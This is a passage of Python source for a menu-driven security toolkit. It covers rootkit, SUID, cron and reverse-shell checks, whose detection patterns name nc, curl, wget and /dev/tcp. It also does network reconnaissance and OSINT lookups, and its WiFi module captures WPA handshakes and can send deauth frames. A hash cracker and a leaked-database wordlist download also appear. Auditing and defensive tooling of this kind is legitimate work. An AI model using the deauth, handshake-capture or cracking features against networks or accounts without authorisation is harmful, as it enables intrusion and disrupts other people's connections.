    entropy = length * len(set(chars)).bit_length()
    print(f"\n  {c('Generated:', GREEN)} {c(pwd, CYAN)}")
    print(f"  {c('Entropy:', GREEN)} ~{entropy} bits\n")


def menu_hash_crypto():
    _menu_loop("hashcrypto", "Hash & Crypto Tools", [
        ("1", "Hash Generator", hash_generator),
        ("2", "Hash Identifier", hash_identifier),
        ("3", "Hash Cracker", hash_cracker),
        ("4", "Encoder / Decoder", encoder_decoder),
        ("5", "Password Generator", password_generator),
        ("6", "Wordlist Manager (download leaked DBs)", download_wordlist),
        ("b", "Back to main menu", None),
    ], CYAN)


menu_hashcrypto = menu_hash_crypto


# ══════════════════════════════════════════════════════
#  MODULE 12: SYSTEM AUDIT
# ══════════════════════════════════════════════════════

def audit_rootkit():
    header_box("Rootkit Detection", RED)
    print(f"  {c('Scanning for common indicators...', RED)}")
    paths = ["/usr/bin/.cinik", "/usr/bin/.font-unix", "/usr/lib/libamplify.so",
             "/tmp/.ice-unix", "/dev/shm/.x", "/usr/share/.hidden", "/var/tmp/.run",
             "/usr/lib/.tcl", "/etc/cron.d/.hidden"]
    found = []
    for p in paths:
        if os.path.exists(p):
            found.append(p)
            print(f"  {c(SYM_X, RED)} {p}")
            add_log_alert("CRITICAL", "Rootkit", f"Indicator: {p}")
    if platform.system().lower() == "linux" and os.path.exists("/etc/passwd"):
        try:
            for line in open("/etc/passwd"):
                parts = line.strip().split(":")
                if len(parts) >= 7 and parts[2].isdigit() and int(parts[2]) == 0:
                    if parts[6] not in ("/bin/bash", "/bin/sh", "/bin/zsh", "/sbin/nologin"):
                        print(f"  {c(SYM_X, RED)} UID 0 unusual shell: {parts[0]} -> {parts[6]}")
                        found.append(line.strip())
        except Exception:
            pass
    print(f"\n  {c('No indicators found.' if not found else f'{len(found)} indicators!', GREEN if not found else RED)}\n")


def audit_suid():
    header_box("SUID/SGID Scanner", RED)
    if platform.system().lower() != "linux":
        print(f"  {YELLOW}Linux only.{RESET}")
        return
    print(f"  {c('Scanning for SUID/SGID binaries...', RED)}")
    dangerous = ["nmap", "nc", "netcat", "ncat", "vim", "vi", "less", "more", "find",
                 "bash", "sh", "dash", "python", "python3", "perl", "ruby", "php", "node",
                 "wget", "curl", "dd", "chmod", "chown"]
    found = 0
    for d in ["/usr/bin", "/usr/sbin", "/usr/local/bin", "/bin", "/sbin"]:
        if not os.path.isdir(d):
            continue
        for fname in os.listdir(d):
            fpath = os.path.join(d, fname)
            try:
                st = os.stat(fpath)
                if st.st_mode & 0o4000:
                    flag = "DANGEROUS" if fname in dangerous else "ok"
                    color = RED if flag == "DANGEROUS" else GREEN
                    print(f"  {c(f'[{flag}]', color)} {fpath}")
                    found += 1
                    if flag == "DANGEROUS":
                        add_log_alert("HIGH", "SUID", f"Dangerous SUID: {fpath}")
            except Exception:
                pass
    print(f"  {c(f'Found {found} SUID binaries', GREEN)}\n")


def audit_cron():
    header_box("Cron Job Analyzer", RED)
    if platform.system().lower() != "linux":
        print(f"  {YELLOW}Linux only.{RESET}")
        return
    print(f"  {c('Analyzing cron jobs...', RED)}")
    suspicious = re.compile(r'(curl|wget|bash -c|python.*-c|nc -|/dev/tcp)', re.I)
    for cp in ["/etc/crontab", "/etc/cron.d/", "/var/spool/cron/crontabs/"]:
        if os.path.isfile(cp):
            try:
                for line in open(cp):
                    line = line.strip()
                    if line and not line.startswith("#"):
                        flag = " SUSPICIOUS" if suspicious.search(line) else ""
                        print(f"  {c(line[:90], RED if flag else GREEN)}{c(flag, RED)}")
                        if flag:
                            add_log_alert("HIGH", "Cron", line[:90])
            except Exception:
                pass
        elif os.path.isdir(cp):
            try:
                for fname in os.listdir(cp):
                    fp = os.path.join(cp, fname)
                    try:
                        for line in open(fp):
                            line = line.strip()
                            if line and not line.startswith("#"):
                                print(f"  {c(line[:90], GREEN)}")
                    except Exception:
                        pass
            except Exception:
                pass
    print()


def audit_kernel():
    header_box("Kernel Hardening Check", RED)
    system = platform.system().lower()
    checks = []
    if system == "linux":
        checks = [("net.ipv4.tcp_syncookies", "SYN cookies", "1"), ("net.ipv4.ip_forward", "IP forwarding", "0"),
                  ("net.ipv4.conf.all.accept_redirects", "ICMP redirects", "0"),
                  ("net.ipv4.conf.all.send_redirects", "Send redirects", "0"),
                  ("net.ipv4.conf.all.accept_source_route", "Source routing", "0"),
                  ("kernel.randomize_va_space", "ASLR", "2"), ("fs.suid_dumpable", "SUID core dumps", "0")]
    else:
        print(f"  {YELLOW}Linux only.{RESET}")
        return
    issues = 0
    for param, desc, expected in checks:
        r = _run(["sysctl", param], timeout=3)
        val = r.stdout.strip().split("=")[-1].strip() if r and r.returncode == 0 else "N/A"
        ok = val == expected
        if not ok:
            issues += 1
            add_log_alert("WARN", "Kernel", f"{desc}={val}")
        print(f"  {c(SYM_CHECK if ok else SYM_X, GREEN if ok else RED)} {desc:30s} {c(val, GREEN if ok else YELLOW)}")
    print(f"  {c(f'{issues} parameters need attention' if issues else 'All checks passed', RED if issues else GREEN)}\n")


def menu_audit():
    _menu_loop("audit", "System Security Audit", [
        ("1", "Rootkit Detection", audit_rootkit),
        ("2", "SUID/SGID Scanner", audit_suid),
        ("3", "Cron Job Analyzer", audit_cron),
        ("4", "Kernel Hardening Check", audit_kernel),
        ("b", "Back to main menu", None),
    ], RED)


# ══════════════════════════════════════════════════════
#  MODULE 13: ADVANCED NETWORK
# ══════════════════════════════════════════════════════

def adv_port_knock():
    header_box("Port Knocking Tester", BLUE)
    target = _get("Target")
    if not target:
        return
    seq = _get("Knock sequence (comma)", "7000,8000,9000")
    ports = [int(p) for p in seq.split(",") if p.strip()]
    final = _get_int("Final port", 22)
    try:
        ip = socket.gethostbyname(target)
        print(f"  {c(f'Knocking: {ports}', CYAN)}")
        for p in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect_ex((ip, p))
            s.close()
            print(f"  {c(f'Knock {p}... sent', GREEN)}")
            time.sleep(0.5)
        time.sleep(1)
        result = _is_port_open(ip, final, timeout=2)
        if result:
            print(f"\n  {RED}{SYM_WARN} Port {final} now OPEN!{RESET}")
            add_log_alert("HIGH", "PortKnock", f"{ip}:{final} opened")
        else:
            print(f"\n  {GREEN}{SYM_CHECK} Port {final} still closed.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
    print()


def adv_banner():
    header_box("Banner Grabbing", BLUE)
    target = _get("Target")
    if not target:
        return
    ports = [int(p) for p in _get("Ports (comma)", "21,22,25,80,443,8080").split(",") if p.strip()]
    try:
        ip = socket.gethostbyname(target)
    except Exception:
        print(f"  {RED}Could not resolve.{RESET}")
        return
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            if port in (80, 443, 8080, 8443):
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            else:
                s.sendall(b"\r\n")
            banner = s.recv(1024).decode(errors="replace").strip()
            s.close()
            print(f"  {c(f'Port {port:5d}', GREEN)} {c(banner[:80], CYAN) if banner else dim('no banner')}")
        except Exception:
            print(f"  {c(f'Port {port:5d}', GREEN)} {c('closed', RED)}")
    print()


def adv_revshell():
    header_box("Reverse Shell Detector", RED)
    print(f"  {c('Checking running processes...', RED)}")
    patterns = [(r'bash\s+-i', "bash -i"), (r'nc\s+-e', "nc -e"), (r'ncat\s+-e', "ncat -e"),
                (r'socat\s+', "socat"), (r'/dev/tcp/', "/dev/tcp"), (r'python.*socket.*connect', "python socket"),
                (r'perl.*socket.*connect', "perl socket"), (r'php.*fsockopen', "php fsockopen")]
    found = []
    if platform.system().lower() == "windows":
        r = _run(["tasklist", "/FO", "CSV", "/NH"], timeout=5)
    else:
        r = _run(["ps", "aux"], timeout=5)
    if r:
        for line in r.stdout.splitlines():
            for pat, desc in patterns:
                if re.search(pat, line, re.I):
                    found.append(desc)
                    print(f"  {c(SYM_X, RED)} [{desc}] {c(line.strip()[:90], YELLOW)}")
                    add_log_alert("CRITICAL", "RevShell", f"{desc}")
    print(f"  {c('No reverse shells found.' if not found else f'{len(found)} suspicious!', GREEN if not found else RED)}\n")


def adv_lan_discovery():
    header_box("LAN Device Discovery", BLUE)
    subnet = _get("Subnet (e.g. 192.168.1.0/24)", "")
    if not subnet:
        try:
            r = subprocess.run(["ip", "-4", "addr", "show"], capture_output=True, text=True, timeout=5)
            m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', r.stdout)
            if m:
                subnet = ".".join(m.group(1).split(".")[:3]) + ".0/24"
        except Exception:
            pass
        if not subnet:
            subnet = "192.168.1.0/24"
    print(f"  {c(f'Scanning {subnet}...', CYAN)}")
    base = ".".join(subnet.split(".")[:3])
    found = 0
    with ThreadPoolExecutor(max_workers=256) as ex:
        def _check(i):
            ip = f"{base}.{i}"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                # ARP is better, but a TCP connect on common ports is permission-free
                for p in (22, 80, 443, 445, 135, 3389):
                    if s.connect_ex((ip, p)) == 0:
                        s.close()
                        return ip
                s.close()
            except Exception:
                pass
            return None
        fs = [ex.submit(_check, i) for i in range(1, 255)]
        for f in as_completed(fs):
            ip = f.result()
            if ip:
                found += 1
                print(f"  {c(SYM_CHECK, GREEN)} {ip}")
    print(f"  {c(f'Found {found} hosts', GREEN)}\n")


def menu_advnet():
    _menu_loop("advnet", "Advanced Network", [
        ("1", "Port Knocking Tester", adv_port_knock),
        ("2", "Banner Grabbing", adv_banner),
        ("3", "Reverse Shell Detector", adv_revshell),
        ("4", "LAN Device Discovery", adv_lan_discovery),
        ("b", "Back to main menu", None),
    ], BLUE)


# ══════════════════════════════════════════════════════
#  MODULE 14: ADVANCED OSINT
# ══════════════════════════════════════════════════════

CF_PREFIXES = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
               "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
               "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
               "197.234.", "198.41."]


def _is_cloudflare(ip):
    return any(ip.startswith(p) for p in CF_PREFIXES)


def _dig_ip(host):
    r = _run(["dig", "+short", host], timeout=3)
    if r and r.returncode == 0:
        for line in r.stdout.strip().splitlines():
            ip = line.strip().rstrip(".")
            if _is_ip(ip):
                return ip
    return None


def osint_ct_log():
    header_box("Certificate Transparency Logs", YELLOW)
    domain = _get("Domain")
    if not domain:
        return
    domain = domain.lower().strip(".")
    with spinner(f"Querying crt.sh for {domain}...", YELLOW):
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15,
                             headers={"User-Agent": "Mozilla/5.0"})
            data = r.json()
        except Exception:
            print(f"  {RED}{SYM_X} crt.sh lookup failed.{RESET}")
            return
    names = set()
    for entry in data:
        for n in entry.get("name_value", "").split("\n"):
            n = n.strip().lower()
            if n and n.endswith(domain):
                names.add(n)
    print(f"\n  {c(f'Found {len(names)} cert names:', CYAN)}")
    for n in sorted(names)[:40]:
        print(f"  {c(n, GREEN)}")
    print()


def osint_dns_history():
    header_box("DNS History Check", YELLOW)
    domain = _get("Domain")
    if not domain:
        return
    domain = domain.lower().strip(".")
    with spinner(f"Checking OTX passive DNS for {domain}...", YELLOW):
        try:
            r = requests.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns",
                             timeout=15, headers={"User-Agent": "Mozilla/5.0"})
            data = r.json()
            entries = data.get("passive_dns", [])
        except Exception:
            entries = []
    seen = []
    for e in entries:
        ip = e.get("address", "")
        if _is_ip(ip) and ip not in [x[0] for x in seen]:
            seen.append((ip, e.get("first", ""), e.get("last", "")))
    print(f"\n  {c(f'Historical IPs ({len(seen)}):', CYAN)}")
    for ip, first, last in seen[:20]:
        print(f"  {c(ip, GREEN):18s} first {c(first[:10], YELLOW)}  last {c(last[:10], CYAN)}")
    print()


def osint_wayback():
    header_box("Wayback Machine Check", YELLOW)
    url = _get("URL")
    if not url:
        return
    with spinner(f"Querying Wayback for {url}...", YELLOW):
        try:
            r = requests.get(f"http://archive.org/wayback/available?url={url}", timeout=15)
            d = r.json()
            snap = (d.get("archived_snapshots") or {}).get("closest", {})
        except Exception:
            snap = {}
    if snap:
        print(f"\n  {c('Snapshot found:', GREEN)} {snap.get('url')}")
        print(f"  {c('Timestamp:', GREEN)} {snap.get('timestamp')}")
    else:
        print(f"\n  {YELLOW}No snapshot found.{RESET}")
    print()


def osint_recon_engine():
    header_box("Recon Engine (Shodan InternetDB)", YELLOW)
    ip = _get("IP address")
    if not ip:
        return
    with spinner(f"Querying Shodan InternetDB for {ip}...", YELLOW):
        try:
            r = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=12,
                             headers={"User-Agent": "Mozilla/5.0"})
            d = r.json()
        except Exception:
            print(f"  {RED}{SYM_X} InternetDB lookup failed.{RESET}")
            return
    if r.status_code == 404:
        print(f"\n  {YELLOW}No data for {ip} in InternetDB.{RESET}")
        return
    print(f"\n  {c('IP:', GREEN)} {ip}")
    print(f"  {c('Ports:', GREEN)} {', '.join(str(p) for p in d.get('ports', [])) or 'none'}")
    print(f"  {c('Hostnames:', GREEN)} {', '.join(d.get('hostnames', [])) or 'none'}")
    print(f"  {c('Vulns:', GREEN)} {', '.join(d.get('vulns', [])) or 'none'}")
    for v in d.get("vulns", []):
        add_log_alert("HIGH", "Recon", f"{ip} vulnerable to {v}")
    print()


def menu_advosint():
    _menu_loop("advosint", "Advanced OSINT", [
        ("1", "Certificate Transparency Logs", osint_ct_log),
        ("2", "DNS History Check", osint_dns_history),
        ("3", "Wayback Machine Check", osint_wayback),
        ("4", "Recon Engine (Shodan InternetDB)", osint_recon_engine),
        ("b", "Back to main menu", None),
    ], YELLOW)


# ══════════════════════════════════════════════════════
#  MODULE 15: WIFI
# ══════════════════════════════════════════════════════

def wifi_scan():
    header_box("WiFi Network Scanner", MAGENTA)
    system = platform.system().lower()
    print(f"  {c('Scanning for WiFi networks...', MAGENTA)}")
    try:
        if system == "linux":
            r = subprocess.run(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi", "list"],
                               capture_output=True, text=True, timeout=20)
            for line in r.stdout.splitlines():
                parts = line.split(":")
                if len(parts) >= 3 and parts[1].strip():
                    print(f"  {c(parts[0], GREEN):28s} {c(parts[1], YELLOW):5s} {c(parts[2], CYAN)}")
            if not r.stdout.strip():
                r = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
                essids = re.findall(r'ESSID:"(.*?)"', r.stdout)
                for e in essids:
                    print(f"  {c(e, GREEN)}")
        elif system == "darwin":
            r = subprocess.run(["airport", "-s"], capture_output=True, text=True, timeout=15)
            for line in r.stdout.splitlines()[1:]:
                print(f"  {c(line[:90], GREEN)}")
        elif system == "windows":
            r = subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True, text=True,
                               timeout=15, encoding="utf-8", errors="replace")
            for line in r.stdout.splitlines():
                if "SSID" in line or "Signal" in line or "Authentication" in line:
                    print(f"  {c(line.strip(), GREEN)}")
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
    print()


def wifi_legal_warning():
    print(f"\n  {RED}{BOLD}{'='*62}{RESET}")
    print(f"  {RED}{BOLD}  LEGAL WARNING{RESET}")
    print(f"  {RED}{'='*62}{RESET}")
    print(f"  {YELLOW}  Auditing wireless networks is ONLY legal on networks{RESET}")
    print(f"  {YELLOW}  YOU OWN or have EXPLICIT WRITTEN PERMISSION to test.{RESET}")
    print(f"  {RED}{'='*62}{RESET}\n")


def wifi_audit():
    header_box("WiFi Security Audit", MAGENTA)
    wifi_legal_warning()
    if not _yes("I own (or have permission for) the target network"):
        print(f"  {YELLOW}Cancelled. Stay legal and ethical.{RESET}\n")
        return
    system = platform.system().lower()
    if system != "linux":
        print(f"  {YELLOW}Full audit needs Linux tools (aircrack-ng suite).{RESET}")
        return
    print(f"  {c('Scanning networks for weak security...', MAGENTA)}")
    try:
        r = subprocess.run(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi", "list"],
                           capture_output=True, text=True, timeout=20)
        for line in r.stdout.splitlines():
            parts = line.split(":")
            if len(parts) >= 3:
                ssid, sec = parts[0], parts[2]
                if sec == "--" or "WEP" in sec or "none" in sec.lower():
                    print(f"  {c(SYM_X, RED)} OPEN/WEAK: {c(ssid, YELLOW)} ({sec})")
                    add_log_alert("WARN", "WiFi", f"Weak network: {ssid}")
                else:
                    print(f"  {c(SYM_CHECK, GREEN)} {c(ssid, GREEN)} ({sec})")
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
    print()


def _nmcli_split(line):
    parts, cur, esc = [], "", False
    for ch in line:
        if esc:
            cur += ch
            esc = False
        elif ch == "\\":
            esc = True
        elif ch == ":":
            parts.append(cur)
            cur = ""
        else:
            cur += ch
    parts.append(cur)
    return parts


def _find_wifi_iface():
    try:
        r = subprocess.run(["nmcli", "-t", "dev", "status"], capture_output=True, text=True, timeout=10)
        if r.returncode == 0 and r.stdout.strip():
            for line in r.stdout.splitlines():
                parts = _nmcli_split(line)
                if len(parts) >= 3 and parts[2] == "wifi":
                    if len(parts) >= 2 and parts[1] == "connected":
                        return parts[0]
            for line in r.stdout.splitlines():
                parts = _nmcli_split(line)
                if len(parts) >= 3 and parts[2] == "wifi":
                    return parts[0]
    except Exception:
        pass
    try:
        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
        names = re.findall(r'Interface\s+(\S+)', r.stdout)
        if names:
            return names[0]
    except Exception:
        pass
    try:
        for n in os.listdir("/sys/class/net"):
            if os.path.exists(f"/sys/class/net/{n}/wireless"):
                return n
    except Exception:
        pass
    return None


def _all_wifi_ifaces():
    ifaces = []
    try:
        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
        names = re.findall(r'Interface\s+(\S+)', r.stdout)
        for n in names:
            if "p2p" not in n.lower() and "mon" not in n.lower():
                ifaces.append(n)
    except Exception:
        pass
    if not ifaces:
        try:
            for n in os.listdir("/sys/class/net"):
                if os.path.exists(f"/sys/class/net/{n}/wireless"):
                    ifaces.append(n)
        except Exception:
            pass
    return ifaces


def _wifi_connected_ssid():
    try:
        r = subprocess.run(["iwgetid"], capture_output=True, text=True, timeout=10)
        m = re.search(r'ESSID:"(.*?)"', r.stdout)
        return m.group(1) if m else None
    except Exception:
        return None


def _wifi_connected_bssid():
    try:
        r = subprocess.run(["iwgetid", "-r", "--ap"], capture_output=True, text=True, timeout=10)
        if r.stdout.strip():
            return r.stdout.strip().lower()
    except Exception:
        pass
    try:
        r = subprocess.run(["iwgetid", "--raw", "--ap"], capture_output=True, text=True, timeout=10)
        if r.stdout.strip():
            return r.stdout.strip().lower()
    except Exception:
        pass
    try:
        r = subprocess.run(["iw", "dev", "link"], capture_output=True, text=True, timeout=10)
        m = re.search(r'Connected to ([0-9a-f:]+)', r.stdout)
        if m:
            return m.group(1).lower()
    except Exception:
        pass
    return None


def _wifi_band(chan):
    try:
        c = int(chan)
        return "2.4G" if c <= 14 else "5G"
    except (TypeError, ValueError):
        return "?"


def _wifi_scan_networks():
    nets = []
    try:
        r = subprocess.run(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"],
                           capture_output=True, text=True, timeout=20)
        if r.returncode == 0 and r.stdout.strip():
            for line in r.stdout.splitlines():
                parts = _nmcli_split(line)
                if len(parts) >= 5 and parts[1] and parts[1] != "--":
                    nets.append({"ssid": parts[0] or "(hidden)", "bssid": parts[1],
                                 "signal": parts[2], "chan": parts[3], "enc": parts[4],
                                 "band": _wifi_band(parts[3])})
            if nets:
                return nets
    except Exception:
        pass
    try:
        r = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
        if r.returncode == 0 and r.stdout.strip():
            cells = re.split(r'\n\s*Cell\s', "\n" + r.stdout)
            for cell in cells[1:]:
                m = re.search(r'Address: ([0-9A-Fa-f:]+)', cell)
                e = re.search(r'ESSID:"(.*?)"', cell)
                ch = re.search(r'Channel[: ]+(\d+)', cell)
                s = re.search(r'Signal level=(-?\d+)', cell)
                enc = "Open" if 'Encryption key:off' in cell else "WPA"
                chan = ch.group(1) if ch else "?"
                ssid = e.group(1) if e else ""
                nets.append({"ssid": ssid if ssid else "(hidden)",
                             "bssid": m.group(1) if m else "?",
                             "chan": chan,
                             "signal": s.group(1) if s else "?",
                             "enc": enc,
                             "band": _wifi_band(chan)})
    except Exception:
        pass
    if not nets:
        try:
            iface = _find_wifi_iface()
            if iface:
                r = subprocess.run(["iw", "dev", iface, "scan"], capture_output=True, text=True, timeout=30)
                if r.returncode == 0 and r.stdout.strip():
                    for block in re.split(r'\nBSS ', r.stdout):
                        if not block.strip():
                            continue
                        m = re.search(r'^([0-9a-f:]{17})', block)
                        e = re.search(r'SSID:(\S+)', block)
                        ch = re.search(r'primary channel: (\d+)', block)
                        s = re.search(r'signal: (-?\d+\.\d+)', block)
                        enc = "Open" if 'WPA' not in block and 'RSN' not in block else "WPA"
                        chan = ch.group(1) if ch else "?"
                        ssid = e.group(1) if e else ""
                        nets.append({"ssid": ssid if ssid else "(hidden)",
                                     "bssid": m.group(1) if m else "?",
                                     "chan": chan,
                                     "signal": s.group(1).split('.')[0] if s else "?",
                                     "enc": enc,
                                     "band": _wifi_band(chan)})
        except Exception:
            pass
    return nets


def wifi_password_audit():
    header_box("WiFi Password Audit (WPA Handshake)", MAGENTA)
    if platform.system().lower() != "linux":
        print(f"  {RED}This module needs Linux tools (airmon-ng / airodump-ng / aircrack-ng).{RESET}")
        print(f"  {YELLOW}Use a Kali/Parrot live USB or VM on other platforms.{RESET}")
        return
    wifi_legal_warning()
    if not _yes("I own (or have written permission for) this network"):
        print(f"  {YELLOW}Cancelled. Stay legal and ethical.{RESET}\n")
        return
    if not _is_root():
        print(f"  {RED}Root privileges are required for monitor mode and packet capture.{RESET}")
        print(f"  {YELLOW}Re-run as root: sudo python3 tool.py  (or: sudo darkie-tools){RESET}\n")
        return
    missing = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not _which(t)]
    if missing:
        print(f"  {YELLOW}Missing tools: {', '.join(missing)}{RESET}")
        if _yes("Install the aircrack-ng suite now", default=True):
            _run_as_admin(["apt-get", "install", "-y", "-qq", "aircrack-ng"], "Installing aircrack-ng suite")
            missing = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not _which(t)]
        if missing:
            print(f"  {RED}aircrack-ng suite still missing. Install it manually (e.g. apt install aircrack-ng).{RESET}\n")
            return
    print(f"  {c('Scanning for nearby WiFi networks...', MAGENTA)}")
    print(f"  {c(SYM_LINE_H * 50, CYAN)}")
    nets = _wifi_scan_networks()
    if not nets:
        print(f"  {RED}No WiFi networks found. Is WiFi enabled?{RESET}\n")
        return
    connected = _wifi_connected_ssid()
    connected_bssid = _wifi_connected_bssid()
    for i, n in enumerate(nets):
        sig = "??" if n["signal"] in ("", "?") else n["signal"]
        enc = n["enc"] if n["enc"] not in ("", "--") else "Open"
        color = GREEN if enc == "Open" else YELLOW
        band = n.get("band", "?")
        marker = ""
        net_bssid = n["bssid"].lower() if n["bssid"] else ""
        if connected_bssid and net_bssid == connected_bssid:
            marker = f"  {c('<- CONNECTED', RED)}"
        print(f"  {c(f'[{i + 1}]', CYAN)}  {c(n['ssid'][:28].ljust(28), color)}  ch {c(n['chan'], CYAN):>4}  {c(band, MAGENTA):>4}  {c(sig, CYAN):>5}  {c(enc, BLUE):>5}{marker}")
    print()
    if connected:
        print(f"  {YELLOW}Tip: only your CONNECTED AP drops when monitor mode starts.{RESET}")
        print(f"  {YELLOW}Pick a different network (or a different band) to stay online.{RESET}\n")
    pick = input(f"  {c(f'Which network? (1-{len(nets)}) or [b] back {SYM_PROMPT} ', CYAN)}").strip().lower()
    if pick == "b":
        return
    if not pick.isdigit() or not (1 <= int(pick) <= len(nets)):
        print(f"  {RED}Invalid choice.{RESET}\n")
        return
    net = nets[int(pick) - 1]
    wifi_legal_warning()
    print(f"  {c('Target: ' + net['ssid'] + '  (' + net['bssid'] + ')', YELLOW)}")
    if not _yes(f"Capture the WPA handshake for {net['ssid']} now", default=False):
        print(f"  {YELLOW}Cancelled.{RESET}\n")
        return
    all_ifaces = _all_wifi_ifaces()
    iface = _find_wifi_iface()
    if not iface and all_ifaces:
        iface = all_ifaces[0]
    if not iface:
        print(f"  {RED}No wireless interface found.{RESET}\n")
        return
    spare = None
    if len(all_ifaces) > 1:
        connected_iface = None
        try:
            r = subprocess.run(["iwgetid"], capture_output=True, text=True, timeout=10)
            mm = re.search(r'^(\S+)\s+ESSID:', r.stdout, re.M)
            if mm:
                connected_iface = mm.group(1)
        except Exception:
            pass
        for a in all_ifaces:
            if a != connected_iface:
                spare = a
                break
        if spare:
            print(f"  {c(f'Using spare adapter {spare} for monitor mode - your connection on {connected_iface} stays up.', GREEN)}")
            iface = spare
    print(f"  {c(f'Wireless interface: {iface}', CYAN)}")
    print(f"\n  {RED}{BOLD}{'=' * 62}{RESET}")
    print(f"  {RED}{BOLD}  MONITOR MODE = INTERNET WILL DROP{RESET}")
    print(f"  {RED}{'=' * 62}{RESET}")
    print(f"  {YELLOW}  Putting {iface} into monitor mode disconnects your current WiFi{RESET}")
    print(f"  {YELLOW}  connection for the duration of the capture.{RESET}")
    print(f"  {YELLOW}  Your connection returns automatically once monitor mode is{RESET}")
    print(f"  {YELLOW}  stopped (your saved network auto-reconnects).{RESET}")
    print(f"  {RED}{'=' * 62}{RESET}\n")
    if not _yes("Continue (your WiFi will briefly drop)", default=False):
        print(f"  {YELLOW}Cancelled. Your connection is untouched.{RESET}\n")
        return
    print(f"  {c('Enabling monitor mode...', MAGENTA)}")
    subprocess.run(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
    mon = None
    iw_out = ""
    try:
        iw_out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10).stdout
    except Exception:
        pass
    for cand in (f"{iface}mon", "mon0", iface):
        if os.path.exists(f"/sys/class/net/{cand}") or f"Interface {cand}" in iw_out:
            mon = cand
            break
    if not mon:
        mon = input(f"  {c(f'Monitor interface name? {SYM_PROMPT} ', CYAN)}").strip() or iface
    capbase = os.path.join("/tmp", f"darkie_cap_{int(time.time())}")
    print(f"  {c('Capturing handshake from ' + net['ssid'] + ' (ch ' + net['chan'] + ')...', GREEN)}")
    print(f"  {YELLOW}If no client connects, we can send a deauth to force a reconnect.{RESET}")
    print(f"  {c('Press Enter to stop early, or wait 20s.', CYAN)}")
    cmd = ["airodump-ng", "--bssid", net["bssid"], "-c", net["chan"], "-w", capbase, "--write-interval", "1", mon]
    import select
    captured = False
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        print(f"  {RED}Failed to start airodump-ng: {e}{RESET}")
        subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return
    try:
        deadline = time.time() + 20
        while time.time() < deadline:
            rdy, _, _ = select.select([p.stdout], [], [], 1.0)
            if p.stdout in rdy:
                line = p.stdout.readline()
                if line:
                    out = line.rstrip("\r\n")
                    if out.strip():
                        print(f"  {c(out.strip()[:120], CYAN)}")
                    if "handshake" in line.lower():
                        captured = True
                        break
            if p.poll() is not None:
                break
    except KeyboardInterrupt:
        pass
    p.terminate()
    try:
        p.wait(timeout=5)
    except Exception:
        p.kill()
    if not captured:
        print(f"  {YELLOW}No handshake yet - a client must connect for the 4-way handshake.{RESET}")
        if _yes(f"Send deauth frames to force {net['ssid']} clients to reconnect", default=False):
            wifi_legal_warning()
            if _yes(f"Confirm deauth on {net['ssid']} (own/permitted network only)", default=False):
                print(f"  {c('Sending deauth frames...', MAGENTA)}")
                subprocess.run(["aireplay-ng", "-0", "5", "-a", net["bssid"], mon],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
                try:
                    deadline = time.time() + 20
                    while time.time() < deadline:
                        rdy, _, _ = select.select([p.stdout], [], [], 1.0)
                        if p.stdout in rdy:
                            line = p.stdout.readline()
                            if line and "handshake" in line.lower():
                                captured = True
                                break
                        if p.poll() is not None:
                            break
                except KeyboardInterrupt:
                    pass
        else:
            if _yes("Keep listening a bit longer", default=False):
                try:
                    deadline = time.time() + 20
                    while time.time() < deadline:
                        rdy, _, _ = select.select([p.stdout], [], [], 1.0)
                        if p.stdout in rdy:
                            line = p.stdout.readline()
                            if line and "handshake" in line.lower():
                                captured = True
                                break
                        if p.poll() is not None:
                            break
                except KeyboardInterrupt:
                    pass
    p.terminate()
    try:
        p.wait(timeout=5)
    except Exception:
        p.kill()
    os.system("stty sane 2>/dev/null")
    subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cap = None
    try:
        base = os.path.basename(capbase)
        cands = [os.path.join("/tmp", f) for f in os.listdir("/tmp")
                 if f.startswith(base) and f.endswith(".cap")]
        if cands:
            cap = max(cands, key=os.path.getmtime)
    except Exception:
        pass
    if not cap or not os.path.exists(cap) or os.path.getsize(cap) == 0:
        print(f"  {RED}No capture saved. The interface may need monitor mode enabled first.{RESET}\n")
        return
    vr = subprocess.run(["aircrack-ng", cap], capture_output=True, text=True)
    if not captured and "handshake" not in vr.stdout.lower():
        print(f"  {RED}No valid WPA handshake in the capture.{RESET}")
